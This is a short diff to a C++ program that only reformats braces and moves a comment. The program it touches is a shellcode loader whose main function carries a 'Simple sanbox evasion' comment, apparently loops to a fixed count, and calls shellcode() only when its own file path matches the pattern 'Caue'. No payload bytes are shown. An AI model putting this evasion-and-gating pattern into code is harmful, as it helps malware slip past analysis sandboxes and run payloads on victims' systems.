@@ -13,7 +13,8 @@ void shellcode();
 
 using namespace std;
 
-int main(int argc, char* argv[]) {
+int main(int argc, char* argv[]) 
+{
 	// Simple sanbox evasion
 	char path[MAX_PATH];
     	int cpt = 0;
@@ -24,16 +25,17 @@ int main(int argc, char* argv[]) {
 	}
 
 	if (cpt == MAX_OP)
-		{
-			GetModuleFileName(NULL, path, MAX_PATH);
-			regex str_expr("(.*)(Caue)(.*)");
-			if (regex_match(path, str_expr)) 
-			{ // Check if the file path matches the regular expression pattern
-				shellcode();
-			}
+	{
+		GetModuleFileName(NULL, path, MAX_PATH);
+		regex str_expr("(.*)(Caue)(.*)");
+		// Check if the file path matches the regular expression pattern
+		if (regex_match(path, str_expr)) 
+		{			
+			shellcode();
 		}
-	return 0;
 	}
+	return 0;
+}
 
 
 void shellcode() {
